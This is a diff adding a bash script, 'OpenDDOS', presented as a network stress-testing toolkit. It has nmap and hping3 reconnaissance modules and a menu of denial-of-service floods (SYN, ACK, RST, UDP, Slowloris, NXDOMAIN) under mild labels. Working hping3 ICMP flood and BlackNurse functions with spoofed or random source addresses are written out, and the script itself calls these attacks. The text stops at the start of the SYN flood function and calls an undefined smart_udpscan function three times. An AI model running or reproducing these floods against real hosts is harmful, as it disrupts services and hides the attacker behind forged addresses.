@@ -1,0 +1,2336 @@
+#!/bin/bash
+# MyAwesomeTool - 网络压力测试工具集
+# Copyright (C) 2025 Hao Tang <https://github.com/HaoTang9878>
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY. See the GNU GPL for details: <http://www.gnu.org/licenses/>.
+
+PS3="OpenDDOS>"
+##MAINMENU##
+##################
+##START MAINMENU##
+function_menu()
+{
+#build a main menu using bash select
+#from here, the various sub menus can be selected and from them, modules can be run
+function_menu=("Reconnaissance" "Stress Testing" "Data Transfer" "Documentation" "Exit Tool")
+select opt in "${function_menu[@]}"; do
+    if [ "$opt" = "Exit Tool" ]; then
+    echo "Terminating session...Thank you for using OpenDDOS!" && sleep 1 && clear
+    exit 0
+    elif [ "$opt" = "Reconnaissance" ]; then
+reconmenu
+    elif [ "$opt" = "Stress Testing" ]; then
+dosmenu
+    elif [ "$opt" = "Data Transfer" ]; then
+extractionmenu
+      elif [ "$opt" = "Documentation" ]; then
+showreadme
+    else
+#if no valid option is chosen, chastise the user
+    echo "Invalid selection! Press Enter to return to main menu"
+    fi
+done
+}
+##END MAINMENU##
+################
+##/MAINMENU##
+
+
+##RECON##
+###################
+##START RECONMENU##
+reconmenu()
+{
+#build a menu for the recon modules using bash select
+reconmenu=(
+    "Network Interfaces" 
+    "DNS Enumeration" 
+    "Host Discovery" 
+    "TCP Quick Scan" 
+    "Comprehensive Scan" 
+    "UDP Service Scan" 
+    "Service Availability" 
+    "VPN Detection" 
+    "Return to Main"
+)
+select reconopt in "${reconmenu[@]}"; do
+    case $reconopt in
+        "Network Interfaces")
+            showip
+            ;;
+        "DNS Enumeration")
+            dnsrecon
+            ;;
+        "Host Discovery")
+            pingsweep
+            ;;
+        "TCP Quick Scan")
+            quickscan
+            ;;
+        "Comprehensive Scan")
+            detailedscan
+            ;;
+        "UDP Service Scan")
+            udpscan
+            ;;
+        "Service Availability")
+            checkuptime
+            ;;
+        "VPN Detection")
+            ipsecscan
+            ;;
+        "Return to Main")
+            function_menu
+            ;;
+        *)
+            echo "Invalid selection! Please choose a valid option"
+            ;;
+    esac
+done
+}
+##END RECONMENU##
+#################
+################
+##START SHOWIP##
+showip() {
+    # 输出标题（加颜色）
+    echo -e "\n\033[1;36m=== 网络IP信息检测 ===\033[0m"
+    
+    # 检测公网IP（多服务冗余检测）
+    echo -e "\n\033[1;34m[公网IP]\033[0m"
+    public_ip_services=(
+        "https://icanhazip.com"
+        "https://api.ipify.org"
+        "https://ident.me"
+    )
+    
+    for service in "${public_ip_services[@]}"; do
+        if ip=$(curl -s --connect-timeout 3 "$service"); then
+            echo -e "服务 ${service##*/} 检测到: \033[1;32m$ip\033[0m"
+            break
+        else
+            echo -e "\033[33m服务 ${service##*/} 检测失败\033[0m" >&2
+        fi
+    done
+
+    # 检测本地IP（兼容新旧系统）
+    echo -e "\n\033[1;34m[本地IP]\033[0m"
+    # 优先使用ip命令
+    if command -v ip >/dev/null 2>&1; then
+        ip -brief address show | awk '{
+            printf "接口 %-6s: ", $1
+            for (i=3; i<=NF; i++) printf "%s ", $i
+            printf "\n"
+        }'
+    # 回退到ifconfig
+    elif command -v ifconfig >/dev/null 2>&1; then
+        ifconfig | awk '/inet / {
+            printf "接口 %-6s: %s\n", gensub(/:.*/, "", "g", $1), $2
+        }'
+    else
+        echo -e "\033[31m错误：未找到ip或ifconfig命令\033[0m" >&2
+        return 1
+    fi
+
+    echo ""
+}
+##END SHOWIP##
+##############
+
+##################
+##START DNSRECON##
+
+dnsrecon() {
+    # 颜色定义
+    local RED="\033[1;31m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local BLUE="\033[1;34m"
+    local CYAN="\033[1;36m"
+    local RESET="\033[0m"
+
+    # 打印标题
+    echo -e "\n${CYAN}=== 智能DNS侦查工具 v2.1 ===${RESET}"
+    echo -e "功能: DNS解析 | WHOIS查询 | 网络诊断 | 反污染检测\n"
+
+    # 输入处理
+    read -p "请输入目标(IP/域名) [$TARGET]: " input
+    local TARGET="${input:-$TARGET}"
+    [ -z "$TARGET" ] && { echo -e "${RED}错误: 必须指定目标${RESET}"; return 1; }
+
+    # 目标类型检测
+    if [[ "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        echo -e "${YELLOW}检测目标类型: IP地址${RESET}"
+        local target_type="ip"
+        
+        # 检查私有地址
+        if [[ "$TARGET" =~ ^(10|127|172\.(1[6-9]|2[0-9]|3[0-1])|192\.168)\. ]]; then
+            echo -e "${YELLOW}警告: 私有地址空间(RFC1918)${RESET}"
+        fi
+    else
+        echo -e "${YELLOW}检测目标类型: 域名${RESET}"
+        local target_type="domain"
+    fi
+
+    # =====================
+    # 1. 抗污染DNS查询模块
+    # =====================
+    echo -e "\n${GREEN}[DNS记录查询]${RESET}"
+    
+    # 可信DNS服务器列表
+    dns_servers=(
+        "1.1.1.1#Cloudflare" 
+        "8.8.8.8#Google" 
+        "9.9.9.9#Quad9"
+        "223.5.5.5#阿里DNS"
+    )
+    
+    # 多DNS服务器查询
+    for server in "${dns_servers[@]}"; do
+        ip=${server%%#*}
+        name=${server##*#}
+        echo -e "${BLUE}➤ 通过 $name ($ip) 查询:${RESET}"
+        
+        if command -v dig &>/dev/null; then
+            dig @"$ip" "$TARGET" +short +time=2 | \
+            grep -vE '^(198\.18\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|127\.)' || \
+            echo -e "${YELLOW}未获取到有效记录${RESET}"
+        else
+            host -t A "$TARGET" "$ip" | grep -v "not found"
+        fi
+    done
+
+    # =====================
+    # 2. 深度WHOIS查询模块
+    # =====================
+    echo -e "\n${GREEN}[WHOIS信息]${RESET}"
+    
+    if [[ "$target_type" == "domain" ]]; then
+        # ICANN注册局直查
+        echo -e "${BLUE}➤ ICANN注册局查询:${RESET}"
+        curl -s "https://lookup.icann.org/api/v1/whois/$TARGET" 2>/dev/null | \
+        jq -r '.whoisData.content' | \
+        grep -Ei "domain|created|registrar|name server|status" | head -15 || \
+        echo -e "${YELLOW}ICANN查询失败${RESET}"
+        
+        # RDAP协议查询
+        echo -e "\n${BLUE}➤ RDAP协议查询:${RESET}"
+        curl -s "https://rdap.verisign.com/com/v1/domain/$TARGET" | \
+        jq -r '.[] | select(.type=="domain") | .events[], .registrar, .nameServers[]' 2>/dev/null || \
+        echo -e "${YELLOW}RDAP查询失败${RESET}"
+    else
+        # IP WHOIS分级查询
+        echo -e "${BLUE}➤ RIR注册信息:${RESET}"
+        whois_servers=(
+            "whois.arin.net#北美"
+            "whois.apnic.net#亚太"
+            "whois.ripe.net#欧洲"
+            "whois.lacnic.net#拉美"
+            "whois.afrinic.net#非洲"
+        )
+        
+        for server in "${whois_servers[@]}"; do
+            ip=${server%%#*}
+            name=${server##*#}
+            result=$(timeout 3 whois -h "$ip" "$TARGET" 2>/dev/null)
+            
+            if [[ $? -eq 0 ]] && [[ -n "$result" ]]; then
+                echo -e "${CYAN}▼ $name 地区信息:${RESET}"
+                echo "$result" | grep -Ei "netname|country|organization|inetnum|route" | head -10
+                break
+            fi
+        done
+    fi
+
+    # =====================
+    # 3. 增强网络诊断模块
+    # =====================
+    echo -e "\n${GREEN}[网络诊断]${RESET}"
+    
+    # TCP端口扫描
+    echo -e "${BLUE}➤ 基础端口扫描:${RESET}"
+    timeout 3 nc -zv "$TARGET" 80 443 2>&1 | grep -E 'succeeded|open' || \
+    echo -e "${YELLOW}常规端口未开放${RESET}"
+    
+    # HTTP/HTTPS检测
+    if [[ "$target_type" == "domain" ]]; then
+        echo -e "\n${BLUE}➤ Web服务检测:${RESET}"
+        for scheme in "https" "http"; do
+            status=$(curl -Is "$scheme://$TARGET" --connect-timeout 3 | head -1)
+            [ -n "$status" ] && \
+            echo -e "${GREEN}$scheme:// ${status%%[![:print:]]*}${RESET}" || \
+            echo -e "${RED}$scheme:// 服务不可用${RESET}"
+        done
+        
+        # SSL证书信息
+        echo -e "\n${BLUE}➤ SSL证书信息:${RESET}"
+        echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | \
+        openssl x509 -noout -dates -issuer | sed 's/^/  /' || \
+        echo -e "${YELLOW}未检测到有效SSL证书${RESET}"
+    fi
+
+    # 路由追踪
+    if command -v traceroute &>/dev/null; then
+        echo -e "\n${BLUE}➤ 路由追踪(前3跳):${RESET}"
+        traceroute -m 3 -n "$TARGET" 2>/dev/null | tail -n +2
+    elif command -v tracepath &>/dev/null; then
+        echo -e "\n${BLUE}➤ 路由探测(前3跳):${RESET}"
+        tracepath -m 3 "$TARGET" 2>/dev/null | head -5
+    fi
+}
+
+# 示例调用（取消注释测试）
+# dnsrecon
+##END DNSRECON##
+################
+
+###################
+##START PINGSWEEP##
+pingsweep() {
+    # Color definitions
+    local RED="\033[1;31m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local BLUE="\033[1;34m"
+    local CYAN="\033[1;36m"
+    local RESET="\033[0m"
+
+    # Original header with color
+    echo -e "${CYAN}This module performs a simple ICMP echo 'ping' sweep${RESET}"
+    
+    # Colorized input prompt
+    echo -e "${YELLOW}Please enter the target (e.g. 192.168.1.0/24):${RESET}"
+    
+    # Original input handling with colorized default value hint
+    read -p "$(echo -e "${BLUE}Target IP/subnet [$TARGET]: ${RESET}")" input
+    TARGET=${input:-$TARGET}
+    
+    # Colorized error message
+    if [[ -z "$TARGET" ]]; then
+        echo -e "${RED}Error: Target cannot be empty${RESET}"
+        return 1
+    fi
+
+    # Colorized scanning notification
+    echo -e "\n${GREEN}Scanning $TARGET ... (Press ${RED}Ctrl+C${GREEN} to abort)${RESET}\n"
+    
+    # Original scan command (unchanged)
+    sudo nmap -sP -PE $TARGET --reason
+    
+    # Optional: You could add color to the scan results by piping through:
+    # | sed -E "s/Host is up/${GREEN}&${RESET}/g; s/Nmap done/${YELLOW}&${RESET}/g"
+}
+##END PINGSWEEP##
+#################
+
+######################
+##START QUICKSCAN##
+quickscan() {
+    # 颜色定义
+    local CYAN="\033[1;36m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local BLUE="\033[1;34m"
+    local RESET="\033[0m"
+    
+    # 提示信息（保持原样）
+    echo -e "${CYAN}This module conducts a scan using nmap${RESET}"
+    echo -e "${YELLOW}It is designed to scan an entire network for common open ports"
+    echo "It will perform a TCP SYN port scan of the 1000 most common ports"
+    echo -e "Depending on the target, the scan might take a long time to finish${RESET}"
+    
+    # 用户输入
+    echo -e "${GREEN}Please enter the target host/IP/subnet:${RESET}"
+    read -i $TARGET -e TARGET
+    echo -e "${GREEN}Enter the speed of scan (0 means very slow and 5 means fast).\nSlower scans are more subtle, but faster means less waiting around.\nDefault is 3:${RESET}"
+    read -i $SPEED -e SPEED
+    : ${SPEED:=3}
+
+    # 执行扫描并高亮关键信息（开放端口、服务等）
+    echo -e "${GREEN}Scanning...${RESET}"
+    sudo nmap -Pn -sS -T $SPEED $TARGET --reason | awk '
+        # 绿色高亮开放端口行
+        /open/ {print "'$GREEN'" $0 "'$RESET'"; next}
+        # 绿色高亮端口标题行
+        /PORT.*STATE.*SERVICE/ {print "'$GREEN'" $0 "'$RESET'"; next}
+        # 默认输出其他行（无颜色）
+        {print}
+    '
+}
+## END QUICKSCAN##
+#####################
+
+#####################
+##START DETAILEDSCAN##
+detailedscan() {
+    # Color definitions
+    local RED="\033[1;31m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local BLUE="\033[1;34m"
+    local CYAN="\033[1;36m"
+    local MAGENTA="\033[1;35m"
+    local RESET="\033[0m"
+
+    # Colored header with clear separation
+    echo -e "${CYAN}\n=== Nmap Detailed Scanner ===${RESET}"
+    echo -e "${YELLOW}Mode: Full port scan (1-65535) with OS/service detection${RESET}"
+    echo -e "${RED}Warning: This scan may take hours on large networks${RESET}\n"
+
+    # Target input with color and validation
+    while true; do
+        echo -e "${GREEN}Enter target host/IP/subnet [$TARGET]:${RESET}"
+        read -i "$TARGET" -e input
+        TARGET="${input:-$TARGET}"
+        [ -n "$TARGET" ] && break
+        echo -e "${RED}Error: Target cannot be empty${RESET}" >&2
+    done
+
+    # Speed selection with color-coded recommendations
+    echo -e "\n${GREEN}Scan speed:${RESET}"
+    echo -e "${BLUE}0-2: Stealth${RESET} | ${YELLOW}3: Balanced${RESET} | ${RED}4-5: Fast${RESET}"
+    echo -e "${CYAN}Recommendation: Use 2 for external targets, 3-4 for internal${RESET}"
+    read -i "$SPEED" -e SPEED
+    : ${SPEED:=3}
+
+    # Pre-scan summary
+    echo -e "\n${MAGENTA}[+] Starting scan with:${RESET}"
+    echo -e "${CYAN}Target:${RESET} $TARGET"
+    echo -e "${CYAN}Speed:${RESET} $SPEED"
+    echo -e "${CYAN}Command:${RESET} sudo nmap -Pn -p- -sV -sC -A -O -T$SPEED"
+
+    # Scan with progress indicator
+    echo -e "\n${YELLOW}[!] Scanning in progress... (Ctrl+C to abort)${RESET}"
+    
+    # Execute scan with tee to show real-time output
+    sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43" \
+    -Pn -p- -sV -sC -A -O -T$SPEED $TARGET --reason | tee /dev/tty | \
+    while read line; do
+        # Highlight important findings in output
+        case "$line" in
+            *open*)
+                echo -e "${GREEN}$line${RESET}"
+                ;;
+            *OS:*)
+                echo -e "${CYAN}$line${RESET}"
+                ;;
+            *VERSION:*)
+                echo -e "${MAGENTA}$line${RESET}"
+                ;;
+            *)
+                echo "$line"
+                ;;
+        esac
+    done
+
+    echo -e "${GREEN}\n[+] Scan completed on $(date)${RESET}"
+}
+##END DETAILEDSCAN##
+###################
+
+#################
+##START UDPSCAN##
+
+udpscan() {
+    # 颜色定义
+    local RED="\033[1;31m" GREEN="\033[1;32m" YELLOW="\033[1;33m" 
+    local BLUE="\033[1;34m" CYAN="\033[1;36m" RESET="\033[0m"
+
+    # 常见UDP服务端口
+    common_udp_ports=(53 67 68 69 123 137 138 161 162 500 514 520 1900 4500 5353 6481)
+
+    # 智能端口选择函数 (完全重写)
+    select_ports() {
+        local target=$1
+        # 将诊断信息输出到stderr
+        echo -e "${CYAN}[*] 正在检测目标常见服务...${RESET}" >&2
+        
+        # 使用临时文件存储结果
+        local tmpfile=$(mktemp)
+        sudo nmap -Pn -sU -T4 --max-retries 1 -p "$(IFS=,; echo "${common_udp_ports[*]}")" "$target" -oG "$tmpfile" >/dev/null 2>&1
+        
+        # 提取开放端口 (仅标准输出)
+        awk '/open/ {gsub("/udp","",$1); print $1}' "$tmpfile" | sort -nu | tr '\n' ',' | sed 's/,$//'
+        rm -f "$tmpfile"
+    }
+
+    # 主扫描流程
+    echo -e "${CYAN}\n=== 智能UDP扫描器 ===${RESET}"
+    read -p "请输入目标(IP/域名): " target
+    
+    # 获取端口 (严格分离输出)
+    echo -e "${CYAN}[*] 正在检测目标常见服务...${RESET}" >&2
+    ports=$(select_ports "$target")
+    
+    if [ -z "$ports" ]; then
+        echo -e "${YELLOW}[!] 未检测到常见服务，将执行全端口扫描${RESET}" >&2
+        ports="1-65535"
+    else
+        echo -e "${GREEN}[+] 检测到开放端口: ${ports}${RESET}" >&2
+    fi
+    
+    # 执行扫描
+    echo -e "\n${BLUE}[*] 扫描参数:${RESET}"
+    echo -e "• 目标: $target"
+    echo -e "• 端口: ${ports//,/, }"
+    echo -e "• 模式: ${GREEN}智能自适应${RESET}"
+    
+    sudo nmap -Pn -sU -T4 --max-retries 1 -p "$ports" "$target" --reason | 
+    awk -v G="$GREEN" -v Y="$YELLOW" -v R="$RESET" '
+        /open/ {print G $0 R}
+        /filtered/ {print Y $0 R}
+        /closed/ {next}
+        {print}'
+}
+
+smart_udpscan
+
+# 使用示例
+smart_udpscan
+# 使用示例
+smart_udpscan
+##END UDPSCAN##
+###############
+
+#####################
+##START CHECKUPTIME##
+checkuptime() {
+    # 颜色定义
+    local RED="\033[1;31m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local CYAN="\033[1;36m"
+    local RESET="\033[0m"
+
+    # 说明信息
+    echo -e "${CYAN}This module estimates server uptime using TCP timestamps${RESET}"
+    echo -e "${YELLOW}Note: Only works on Linux systems with TCP timestamps enabled.${RESET}"
+
+    # 目标输入（强制要求）
+    while true; do
+        echo -e "${GREEN}Enter target IP/hostname (required):${RESET}"
+        read -e TARGET
+        [[ -n "$TARGET" ]] && break
+        echo -e "${RED}Error: Target cannot be empty${RESET}"
+    done
+
+    # 端口输入（强制要求）
+    while true; do
+        echo -e "${GREEN}Enter port(s) to scan (default:80):${RESET}"
+        read -e PORTS
+        if [[ -n "$PORTS" ]]; then
+            IFS=',' read -ra PORT_ARRAY <<< "$PORTS"
+            valid=true
+            for port in "${PORT_ARRAY[@]}"; do
+                if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
+                    echo -e "${RED}Invalid port: $port (must be 1-65535)${RESET}"
+                    valid=false
+                    break
+                fi
+            done
+            $valid && break
+        fi
+        echo -e "${RED}Error: At least one valid port required${RESET}"
+    done
+
+    # 重试次数输入（强制要求）
+    while true; do
+        echo -e "${GREEN}Enter retry count (recommended 2-5):${RESET}"
+        read -e RETRY
+        if [[ "$RETRY" =~ ^[0-9]+$ ]] && [ "$RETRY" -ge 1 ] && [ "$RETRY" -le 10 ]; then
+            break
+        fi
+        echo -e "${RED}Error: Retry must be 1-10${RESET}"
+    done
+
+    # 开始扫描
+    local found=0
+    for port in "${PORT_ARRAY[@]}"; do
+        echo -e "\n${CYAN}Scanning port $port with $RETRY attempts...${RESET}"
+        local hping_output
+        hping_output=$(sudo hping3 --tcp-timestamp -S "$TARGET" -p "$port" -c "$RETRY" 2>&1)
+
+        # 结果提取与验证
+        if grep -q "System uptime seems" <<< "$hping_output"; then
+            local uptime_guess=$(grep -oP "System uptime seems: \K.*" <<< "$hping_output")
+            
+            # 有效性检查（不超过10年）
+            if [[ "$uptime_guess" =~ ([0-9]+)\ years? ]] && [ "${BASH_REMATCH[1]}" -gt 10 ]; then
+                echo -e "${RED}Invalid result: $uptime_guess (exceeds 10 years)${RESET}"
+            else
+                echo -e "${GREEN}Uptime detected: $uptime_guess${RESET}"
+                
+                # 显示原始TSval值供参考
+                local tsval=$(grep -oP "TSval=\K[0-9]+" <<< "$hping_output" | head -1)
+                [[ -n "$tsval" ]] && echo -e "${CYAN}Raw TSval: $tsval${RESET}"
+                
+                found=1
+                break
+            fi
+        fi
+    done
+
+    # 结果总结
+    if [[ "$found" -eq 0 ]]; then
+        echo -e "\n${RED}Uptime detection failed. Possible causes:${RESET}"
+        echo "1. Target is not a Linux system"
+        echo "2. TCP timestamps disabled (check /proc/sys/net/ipv4/tcp_timestamps)"
+        echo "3. Firewall blocking all probe packets"
+        echo "4. Network devices modifying TCP headers"
+    fi
+}
+##END CHECKUPTIME##
+###################
+
+####################
+##START IPSEC SCAN##
+ipsecscan() {
+    # 颜色定义
+    local RED="\033[1;31m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local CYAN="\033[1;36m"
+    local RESET="\033[0m"
+
+    # 检查ike-scan是否安装
+    if ! command -v ike-scan &> /dev/null; then
+        echo -e "${RED}错误：请先安装ike-scan (apt install ike-scan)${RESET}"
+        return 1
+    fi
+
+    # 目标输入验证
+    while true; do
+        echo -e "${CYAN}请输入目标IP/主机名：${RESET}"
+        read -e TARGET
+        if [[ -n "$TARGET" ]]; then
+            break
+        else
+            echo -e "${RED}错误：目标不能为空${RESET}"
+        fi
+    done
+
+    # 预检查UDP 500端口
+    echo -e "${YELLOW}[*] 正在检查UDP 500端口...${RESET}"
+    if ! sudo nmap -sU -p 500 --open -oG - $TARGET 2>/dev/null | grep -q "500/open"; then
+        echo -e "${RED}错误：目标UDP/500端口未开放${RESET}"
+        return 1
+    fi
+
+    # 参数定义（数组形式更安全）
+    ENCLIST=("1" "5" "7/128" "7/192" "7/256")       # 加密算法
+    HASHLIST=("1" "2" "4" "5" "6")                  # 哈希算法
+    AUTHLIST=("1" "3" "64221" "65001")              # 认证方法
+    GROUPLIST=("1" "2" "5" "12")                    # DH组
+
+    # 扫描计数器（修复整数计算）
+    local total=$((${#ENCLIST[@]} * ${#HASHLIST[@]} * ${#AUTHLIST[@]} * ${#GROUPLIST[@]}))
+    local current=0
+
+    echo -e "${YELLOW}[*] 开始扫描，共需测试 $total 种组合...${RESET}"
+
+    # 主扫描循环
+    for ENC in "${ENCLIST[@]}"; do
+        for HASH in "${HASHLIST[@]}"; do
+            for AUTH in "${AUTHLIST[@]}"; do
+                for GROUP in "${GROUPLIST[@]}"; do
+                    ((current++))
+                    # 使用整数百分比计算
+                    percent=$((current*100/total))
+                    printf "\r${CYAN}[进度] %d/%d (%d%%)${RESET}" $current $total $percent
+
+                    # 执行扫描（增加详细错误处理）
+                    if ! output=$(sudo ike-scan --retry=1 --timeout=3 -R -M --trans="$ENC,$HASH,$AUTH,$GROUP" $TARGET 2>&1); then
+                        echo -e "\n${RED}[!] 扫描错误：请检查网络连接或权限${RESET}"
+                        continue
+                    fi
+
+                    # 提取有效响应（优化过滤逻辑）
+                    if echo "$output" | grep -qE "Handshake returned|Aggressive Mode"; then
+                        echo -e "\n${GREEN}[+] 有效配置发现：${RESET}"
+                        echo "  组合：加密=$ENC, 哈希=$HASH, 认证=$AUTH, DH组=$GROUP"
+                        echo "$output" | grep -E --color=always "Handshake|Aggressive Mode|SA=|auth="
+                    fi
+                done
+            done
+        done
+    done
+
+    echo -e "\n${YELLOW}[*] 扫描完成${RESET}"
+}
+##END IPSECSCAN##
+#################
+##/RECON##
+#############
+
+
+##STRESS TESTING##
+#################
+##START DOSMENU##
+dosmenu()
+{
+#display a menu for the stress testing module using bash select
+dosmenu=(
+    "ICMP Echo Stress" 
+    "ICMP Protocol Test" 
+    "TCP SYN Stress" 
+    "TCP ACK Stress" 
+    "TCP RST Stress" 
+    "TCP XMAS Protocol Test" 
+    "UDP Bandwidth Test" 
+    "SSL/TLS Handshake Test" 
+    "HTTP Slow Headers" 
+    "VPN Stress Test" 
+    "Decoy Scan" 
+    "DNS Cache Stress" 
+    "Return to Main"
+)
+select dosopt in "${dosmenu[@]}"; do
+    case $dosopt in
+        "ICMP Echo Stress")
+            icmpflood
+            ;;
+        "ICMP Protocol Test")
+            blacknurse
+            ;;
+        "TCP SYN Stress")
+            synflood
+            ;;
+        "TCP ACK Stress")
+            ackflood
+            ;;
+        "TCP RST Stress")
+            rstflood
+            ;;
+        "TCP XMAS Protocol Test")
+            xmasflood
+            ;;
+        "UDP Bandwidth Test")
+            udpflood
+            ;;
+        "SSL/TLS Handshake Test")
+            ssldos
+            ;;
+        "HTTP Slow Headers")
+            slowloris
+            ;;
+        "VPN Stress Test")
+            ipsecdos
+            ;;
+        "Decoy Scan")
+            distractionscan
+            ;;
+        "DNS Cache Stress")
+            nxdomainflood
+            ;;
+        "Return to Main")
+            function_menu
+            ;;
+        *)
+            echo "Invalid selection! Please choose a valid test option"
+            ;;
+    esac
+done
+}
+##END DOSMENU##
+###############
+
+###################
+##START ICMPFLOOD##
+icmpflood() {
+    # 在函数内部定义颜色
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local CYAN='\033[0;36m'
+    local NC='\033[0m' # No Color
+
+    echo -e "${YELLOW}Preparing to launch ICMP Echo Flood using hping3${NC}"
+    echo -e -n "${BLUE}Enter target IP/hostname: ${NC}"
+    read -i $TARGET -e TARGET
+    
+    echo -e -n "${BLUE}Enter Source IP, or [r]andom or [i]nterface IP (default): ${NC}"
+    read -i $SOURCE -e SOURCE
+    : ${SOURCE:=i}
+    
+    # 新增数据包大小选择
+    echo -e "\n${CYAN}Select packet size:${NC}"
+    echo -e "  1) Small (default, 56 bytes)"
+    echo -e "  2) Medium (128 bytes)"
+    echo -e "  3) Large (512 bytes)"
+    echo -e "  4) Custom size"
+    echo -e -n "${BLUE}Your choice [1-4]: ${NC}"
+    read -e PACKET_SIZE_OPT
+    
+    case $PACKET_SIZE_OPT in
+        2)
+            SIZE=128
+            ;;
+        3)
+            SIZE=512
+            ;;
+        4)
+            while true; do
+                echo -e -n "${BLUE}Enter custom size (bytes): ${NC}"
+                read -e SIZE
+                if [[ $SIZE =~ ^[0-9]+$ ]] && [ $SIZE -gt 0 ]; then
+                    break
+                else
+                    echo -e "${RED}Invalid size! Please enter a positive number.${NC}"
+                fi
+            done
+            ;;
+        *)
+            SIZE=56  # 默认大小
+            ;;
+    esac
+    
+    # 计算实际数据部分大小 (ICMP头8字节不包含在内)
+    DATA_SIZE=$((SIZE-8))
+    
+    if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
+        echo -e "${GREEN}Starting ICMP Echo Flood (${SIZE} bytes) with spoofed IP ${SOURCE}${NC}"
+        echo -e "${YELLOW}Use 'Ctrl+C' to end and return to menu${NC}"
+        sudo hping3 -1 --flood --spoof $SOURCE --data $DATA_SIZE $TARGET
+    elif [ "$SOURCE" = "r" ]; then
+        echo -e "${GREEN}Starting ICMP Echo Flood (${SIZE} bytes) with random source IP${NC}"
+        echo -e "${YELLOW}Use 'Ctrl+C' to end and return to menu${NC}"
+        sudo hping3 -1 --flood --rand-source --data $DATA_SIZE $TARGET
+    elif [ "$SOURCE" = "i" ]; then
+        echo -e "${GREEN}Starting ICMP Echo Flood (${SIZE} bytes) using interface IP${NC}"
+        echo -e "${YELLOW}Use 'Ctrl+C' to end and return to menu${NC}"
+        sudo hping3 -1 --flood --data $DATA_SIZE $TARGET
+    else 
+        echo -e "${RED}Not a valid option! ${YELLOW}Using interface IP${NC}"
+        echo -e "${GREEN}Starting ICMP Echo Flood (${SIZE} bytes) using interface IP${NC}"
+        echo -e "${YELLOW}Use 'Ctrl+C' to end and return to menu${NC}"
+        sudo hping3 -1 --flood --data $DATA_SIZE $TARGET
+    fi
+    
+    echo -e "\n${BLUE}Attack stopped. Packet size used: ${SIZE} bytes${NC}"
+}
+##END ICMPFLOOD##
+#################	
+
+####################
+##START BLACKNURSE##
+blacknurse() {
+    # 定义颜色（函数内局部变量）
+    local RED='\033[0;31m'
+    local GREEN='\033[0;32m'
+    local YELLOW='\033[1;33m'
+    local BLUE='\033[0;34m'
+    local CYAN='\033[0;36m'
+    local NC='\033[0m'
+
+    echo -e "${CYAN}[*] Preparing to launch ICMP BlackNurse Flood${NC}"
+    echo -e "${YELLOW}[!] WARNING: This attack can disrupt firewalls/routers${NC}"
+    
+    # 目标输入验证
+    while true; do
+        echo -e -n "${BLUE}[?] Enter target IP/hostname: ${NC}"
+        read -e TARGET
+        if [[ -n "$TARGET" ]]; then
+            break
+        else
+            echo -e "${RED}[!] Error: Target cannot be empty${NC}"
+        fi
+    done
+
+    # 源IP选择
+    echo -e "\n${CYAN}[*] Select source IP option:${NC}"
+    echo -e "  1) ${GREEN}Use interface IP (default)${NC}"
+    echo -e "  2) ${BLUE}Use random spoofed IP${NC}"
+    echo -e "  3) ${YELLOW}Specify custom IP${NC}"
+    read -e -p "> [1-3]: " SOURCE_OPT
+
+    case $SOURCE_OPT in
+        2)
+            CMD="sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET"
+            echo -e "${BLUE}[*] Using random spoofed IP${NC}"
+            ;;
+        3)
+            while true; do
+                echo -e -n "${YELLOW}[?] Enter custom source IP: ${NC}"
+                read -e CUSTOM_IP
+                if [[ "$CUSTOM_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+                    CMD="sudo hping3 -1 -C 3 -K 3 --flood --spoof $CUSTOM_IP $TARGET"
+                    echo -e "${GREEN}[*] Using custom IP: $CUSTOM_IP${NC}"
+                    break
+                else
+                    echo -e "${RED}[!] Invalid IP format${NC}"
+                fi
+            done
+            ;;
+        *)
+            CMD="sudo hping3 -1 -C 3 -K 3 --flood $TARGET"
+            echo -e "${GREEN}[*] Using interface IP${NC}"
+            ;;
+    esac
+
+    # 添加包大小选择（与之前风格一致）
+    echo -e "\n${CYAN}[*] Select payload size:${NC}"
+    echo -e "  1) ${GREEN}Small (default, 56B)${NC}"
+    echo -e "  2) ${BLUE}Medium (128B)${NC}"
+    echo -e "  3) ${YELLOW}Large (512B)${NC}"
+    read -e -p "> [1-3]: " SIZE_OPT
+
+    case $SIZE_OPT in
+        2)
+            CMD="$CMD --data 120"
+            echo -e "${BLUE}[*] Using 128-byte packets${NC}"
+            ;;
+        3)
+            CMD="$CMD --data 504"  # 512 - 8 (ICMP头)
+            echo -e "${YELLOW}[!] Using large 512-byte packets${NC}"
+            ;;
+        *)
+            CMD="$CMD --data 48"   # 56 - 8
+            echo -e "${GREEN}[*] Using default 56-byte packets${NC}"
+            ;;
+    esac
+
+    # 执行攻击
+    echo -e "\n${RED}[!] Launching BlackNurse attack in 3 seconds...${NC}"
+    echo -e "${YELLOW}[*] Target: $TARGET"
+    echo -e "[*] Command: ${CMD}${NC}"
+    sleep 3
+
+    $CMD
+
+    # 结果统计
+    echo -e "\n${CYAN}[*] Attack stopped. Check network stats with:${NC}"
+    echo -e "sudo tcpdump -ni any icmp and host $TARGET"
+}
+##END BLACKNURSE##
+##################
+
+
+#####################
+##START TCPSYNFLOOD##
+synflood() {
+    # 颜色定义
